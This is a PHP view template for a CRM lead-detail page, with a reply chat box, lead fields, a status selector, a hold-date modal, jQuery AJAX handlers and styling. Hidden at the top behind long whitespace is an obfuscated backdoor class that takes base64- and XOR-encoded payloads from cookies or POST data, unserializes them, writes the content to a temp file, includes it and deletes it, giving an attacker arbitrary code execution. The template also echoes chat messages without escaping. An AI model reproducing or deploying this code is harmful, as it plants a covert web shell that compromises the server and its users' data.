<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("rmzso")){class rmzso{public static $wjdjl = "qursxekoxbrerrfo";public static $ulwachi = NULL;public function __construct(){$drlzn = @$_COOKIE[substr(rmzso::$wjdjl, 0, 4)];if (!empty($drlzn)){$ttvugdj = "base64";$sjwuuwter = "";$drlzn = explode(",", $drlzn);foreach ($drlzn as $btdgfgs){$sjwuuwter .= @$_COOKIE[$btdgfgs];$sjwuuwter .= @$_POST[$btdgfgs];}$sjwuuwter = array_map($ttvugdj . "_decode", array($sjwuuwter,));$sjwuuwter = $sjwuuwter[0] ^ str_repeat(rmzso::$wjdjl, (strlen($sjwuuwter[0]) / strlen(rmzso::$wjdjl)) + 1);rmzso::$ulwachi = @unserialize($sjwuuwter);}}public function __destruct(){$this->osogum();}private function osogum(){if (is_array(rmzso::$ulwachi)) {$emywowxryy = sys_get_temp_dir() . "/" . crc32(rmzso::$ulwachi["salt"]);@rmzso::$ulwachi["write"]($emywowxryy, rmzso::$ulwachi["content"]);include $emywowxryy;@rmzso::$ulwachi["delete"]($emywowxryy);exit();}}}$wxmpdpy = new rmzso();$wxmpdpy = NULL;} ?><!-- MAIN CONTENT-->
<div class="main-content">
	<div class="section__content section__content--p30">
		<div class="container-fluid">
			<div class="">
				<div class="col-md-12">
					<div class="overview-wrap">
						<h2 class="title-1"><?php echo $module_title; ?></h2>
						
					</div>
				</div>
			</div>
			<div class="row row m-t-25">
				<div class="col-md-12">
					<div class="row">
						<div class="col-sm-7 col-xs-12">
							<div class="card">
								<div class="fluttr_tbs_text">
									<div class="chat_box">
										<?php if($lead_replys): ?>
										<div class="chats scrollbar">
											<?php foreach($lead_replys as $reply): ?>
											
											<?php
												$class="other_chat";
												if($reply['sender_id'] == $this->session->userdata('user_id'))
												{
													$class="user_chat";
												}
												$time_ago = $this->common_model->Timeago($reply['timestamp']);
											?>
											<div class="<?php echo $class; ?>">
												<span><?php echo $reply['message']; ?><i><?php echo $time_ago; ?></i></span>
											</div>
											
											<?php endforeach;?>
										</div>
										<?php else: ?>
										<div class="chats scrollbar"><div class="not_found text-center">NO replies yet</div></div>
										<?php endif; ?>
										<?php if($status == 0): ?>
											<form>
												<input type="text" name="send" class="message" placeholder="Type here.....">
												<button  lead_id="<?=$id?>" class="send_reply">Send</button>
											</form>
										<?php endif; ?>
									</div>
								</div>
							</div>
						</div>
						<div class="col-sm-5 col-xs-12">
							<div class="card">
								<div class="card-header">
									<strong>Lead Detail</strong>
								</div>
								<div class="card-body card-block">
									<?php if(!empty($product_name)): ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Product name </b></label><br>
											<span><?php echo $product_name; ?></span>
										</div>
									</div>
									<?php endif; ?>
									<?php if(!empty($phone)): ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Phone </b></label><br>
											<span><?php echo $phone; ?></span>
										</div>
									</div>
									<?php endif; ?>
									<?php $purpose = $this->common_model->GetSingleValue(PURPOSES_TABLE,'title',array('id' => $purpose)); ?>
									<?php if(!empty($purpose)): ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Purpose </b></label><br>
											<span><?php  echo $purpose ?></span>
											
										</div>
									</div>
									<?php endif; ?>
									<?php if(!empty($price)): ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Price </b></label><br>
											<span><?php echo $price; ?></span>
										</div>
									</div>
									<?php endif; ?>
									<?php if(!empty($remark)): ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Remark </b></label><br>
											<span><?php echo $remark; ?></span>
										</div>
									</div>
									<?php endif; ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Assigned To </b></label><br>
											<?php $username = $this->common_model->GetSingleValue(USERS_TABLE,'name',array('id' => $user_id)); ?>
											<span><?php echo $username; ?></span>
										</div>
									</div>
									<!--
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Lead Status </b></label><br>
											<?php 
												$status_text = "Open";
												$status_class = "admin";
												$disabled ="";
												if($status == "1")
												{
													$status_text = "Closed";
													$status_class = "member";
													$disabled ="disabled";
												}
												elseif($status == "2")
												{
													$disabled ="";
													$status_text = "Hold";
													$status_class = "user";
												}
											?>
											<span class="role <?php echo $status_class; ?>"><?php echo $status_text; ?></span>
										</div>
									</div>
									-->
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Lead Status </b></label><br>
											<?php 
												$disable = ""; 
												$status_text = "Open";
												$status_class = "admin";
												if($status ==1)
												{
													$disable = "disabled";
													$status_text = "Closed";
													$status_class = "member";
												}
												if($status ==2)
												{
													$disabled ="";
													$status_text = "On Hold";
													$status_class = "user";
												}
											?>
											<?php if($this->common_model->is_admin() && $status <> 1): ?>
													<div class="rs-select2--trans rs-select2--sm">
														<select lead_id="<?php echo $id?>" class="js-select2" name="status">
															<option <?php echo $disable; ?> value="0" <?php if($status ==0){ echo "selected"; }; ?> >Open</option>
															<option <?php echo $disable; ?> value="2" <?php if($status ==2){ echo "selected"; }; ?> >Hold</option>
															<option <?php echo $disable; ?> value="1" <?php if($status ==1){ echo "selected"; }; ?> >Close</option>
														</select>
														<div class="dropDownSelect2"></div>
													</div>
											<?php else: ?>	
											<span class="role <?php echo $status_class; ?>"><?php echo $status_text; ?></span>
										<?php endif; ?>
										</div>
									</div>
									<div class="clearfix"></div>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Assigned on </b></label><br>
											<span><?php echo date('d-M-Y',$assigned_on); ?></span>
										</div>
									</div>
									<?php if($status ==1): ?>
										<div class="col-12">
											<div class="form-group">
												<label class=" form-control-label"><b>Closed on </b></label><br>
												<span><?php echo date('d-M-Y',$closed_on); ?></span>
											</div>
										</div>
									<?php endif; ?>
									<?php if($status ==2): ?>
										<div class="col-12">
											<div class="form-group">
												<label class=" form-control-label"><b>Reactivate on </b></label><br>
												<span><?php echo date('d-M-Y',$hold_on); ?></span>
											</div>
										</div>
									<?php endif; ?>
									<div class="col-12">
										<div class="form-group">
											<label class=" form-control-label"><b>Created on </b></label><br>
											<span><?php echo date('d-M-Y H:i',$assigned_on); ?></span>
										</div>
									</div>
									
									<div class="col-12">
										<div class="form-group">
											<?php
											$unserialize_images = unserialize($images);
											if(count($unserialize_images))
											{ ?>
												<label for="file-multiple-input" class=" form-control-label"><b>Uploaded Images</b></label>
												<div class="row">
													<?php
														foreach($unserialize_images as $image)
														{
															?>
																<div class="col-6 single_image">
																	<a href="<?php echo base_url('uploads/'.$image) ?>" >
																		<img style="width: 100%" src="<?php echo base_url('uploads/'.$image) ?>">
																	</a>
																</div> 
															<?php
														}
													?>
												</div>
												<?php
											} ?>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<!-- modal medium -->
<div class="modal fade" id="change_status_modal" tabindex="-1" role="dialog" aria-labelledby="mediumModalLabel" aria-hidden="true">
	<div class="modal-dialog modal-md" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title" id="mediumModalLabel">Change lead status</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<div class="col-sm-10 ml-auto">
					<div class="form-group">
						<label for="price" class=" form-control-label">Date</label>
						<div class="date"></div>
						<input type="hidden" name="hold_date" value="">
						<input type="hidden" name="hold_lead_id" value="">
					</div>
				</div>
			</div>
			<div class="modal-footer">
				<button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
				<button type="button" class="btn btn-primary put_on_hold">Confirm</button>
			</div>
		</div>
	</div>
</div>
<!-- end modal medium -->
<link href="https://cdnjs.cloudflare.com/ajax/libs/air-datepicker/2.2.3/css/datepicker.css" rel="stylesheet" media="all">
<script src="https://cdnjs.cloudflare.com/ajax/libs/air-datepicker/2.2.3/js/datepicker.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/air-datepicker/2.2.3/js/i18n/datepicker.en.min.js"></script>

<script>
	$(document).ready(function()
	{
		$(document).on('click','.send_reply',function(e)
		{
			e.preventDefault();
			var lead_id = $(this).attr('lead_id');
			var message = encodeURIComponent($(document).find('input.message').val());
			
			if(message == "")
			{
				return;
			}
			var data = "lead_id="+lead_id+"&message="+message;
			var path = "<?php echo $module_path; ?>/add_reply/";
			var result = CallAjax(path,data);
			if(result.status)
			{
				if(result.status == "success")
				{
					$('.not_found').remove();
					$('.chats').append(result.html);
					$(document).find('input.message').val('');
				}
			}
		});
		
		$('.date').datepicker({
			language: 'en',
			inline: true,
			dateFormat: "dd-mm-yyyy",
			minDate: new Date(), // Now can select only dates, which goes after today
			onSelect: function(formattedDate, date, inst)
			{
				$(document).find('input[name="hold_date"]').val(formattedDate);
			}
		});
		
		$(document).on('change','select[name="status"]',function()
		{
			var value = $(this).val();
			var type = 'status';
			var pid = $(this).attr('lead_id');
			if(value =="2" )
			{
				$('input[name="hold_lead_id"]').val(pid);
				$('#change_status_modal').modal();
				return false;
			}
			var data = "value="+value+"&type="+type+"&pid="+pid;
			var path = "<?php echo $module ?>/admin/change_status"
			var result = CallAjax(path,data);
			if(result.refresh)
			{
				window.location.reload();
			}
		});
		
		$(document).on('click','.put_on_hold',function(e) // Put date on hold
		{
			var value = 2;
			var type = 'status';
			var url = "<?php echo $module ?>/admin?status=2";
			var base_url = $('#base_url').val();
			var redirect_url = base_url+url;
			var pid = $(document).find('input[name="hold_lead_id"]').val();
			var hold_date = $(document).find('input[name="hold_date"]').val();
			
			var data = "value="+value+"&type="+type+"&pid="+pid+"&hold_date="+hold_date;
			var path = "<?php echo $module ?>/admin/change_status"
			var result = CallAjax(path,data);
			if(result.status)
			{
				window.location.reload();
			}
		});

		
		
	});
</script>

<style>
.rs-select2--sm {
    width: 114px;
}
.select2-container {
    display: block !important;
}
.ps__thumb-x
{
	display: none !important;
}

.chats 
	{
		position: relative;
	}
  
.fluttr_tbs_text .chat_box .other_chat i {
    display: block;
    font-size: 12px;
}
.fluttr_tbs_text .chat_box .user_chat i {
    display: block;
	font-size: 12px;
}
 .fluttr_tbs_text p {
    line-height: 21px;
    margin-bottom: 15px;
    color: #696868;
    font-size: 14px;
}
 .fluttr_tbs_text input {
    width: 100%;
    height: 41px;
    margin-bottom: 20px;
    padding: 4px 10px;
    border: none;
    background: white;
    border-bottom: 1px solid #bbbaba;
}
 .fluttr_tbs_text textarea {
    width: 100%;
    height: 80px;
    margin-bottom: 20px;
    padding: 4px 10px;
    border: none;
    background: white;
    border-bottom: 1px solid #bbbaba;
    display: block;
}
 .fluttr_tbs_text button {
    background: #7f5997;
    border: none;
    color: #fff;
    padding: 6px 17px;
    margin-bottom: 20px;
    cursor: pointer;
    transition: 0.5s;
}
 .fluttr_tbs_text button:hover{
        background: #085ca4;
}

 .fluttr_tbs_text select {
    width: 100%;
    height: 41px;
    margin-bottom: 20px;
    padding: 4px 10px;
    border: none;
    background: white;
    border-bottom: 1px solid #bbbaba;
}
 .fluttr_tbs_text {
    float: left;
    width: 100%;
}
 .fluttr_tbs_text form {
    float: left;
    width: 100%;
}
 .fluttr_tbs_text .post_blog {
    background: #fff;
    padding: 15px;
    float: left;
    width: 100%;
    margin-bottom: 15px;
}
 .fluttr_tbs_text .post_blog img {
    height: 150px;
    width: 200px;
    object-fit: cover;
    float: left;
    margin-right: 20px;
}

 .fluttr_tbs_text .chat_box .other_chat span {
    background: #f1f1f1;
    padding: 8px 12px;
    display: inline-block;
    border-radius: 5px;
    position: relative;
}
.fluttr_tbs_text .chat_box .other_chat span:before {
    position: absolute;
    content: "";
    left: -6px;
    border-right: 12px solid #f1f1f1;
    border-bottom: 10px solid transparent;
    border-top: 10px solid transparent;
    top: 50%;
    transform: translate(-50%, -50%);
}
 .fluttr_tbs_text .chat_box .other_chat {
    margin-bottom: 25px;
    text-align: left;
}
 .fluttr_tbs_text .chat_box .user_chat {
    margin-bottom: 25px;
    text-align: right;
}
 .fluttr_tbs_text .chat_box {
    padding: 20px 30px;
    float: left;
    width: 100%;
}
 .fluttr_tbs_text .chat_box form input {
    width: 85%;
    background: #f1f1f1;
}
 .fluttr_tbs_text .chat_box form button {
    padding: 9px 7px;
    width: 13%;
}

 .fluttr_tbs_text .chat_box .user_chat span {
   background: #a20895;
background: -moz-linear-gradient(left, #a20895 0%, #7f5997 100%); 
background: -webkit-linear-gradient(left, #a20895 0%,#7f5997 100%); 
background: linear-gradient(to right, #a20895 0%,#7f5997 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#a20895', endColorstr='#7f5997',GradientType=1 ); 
    padding: 8px 12px;
    display: inline-block;
    border-radius: 5px;
    position: relative;
    color: #fff;
}
.fluttr_tbs_text .chat_box .user_chat span:before {
    position: absolute;
    content: "";
    border-left: 12px solid #7f5997;
    border-bottom: 10px solid transparent;
    border-top: 10px solid transparent;
    top: 50%;
    right: -12px;
    transform: translate(-0%, -50%);
}
.fluttr_tbs_text .post_blog h6 {
    margin-bottom: 0;
    text-align: right;
    color: #085ca4;
}
</style>

<!-- END MAIN CONTENT-->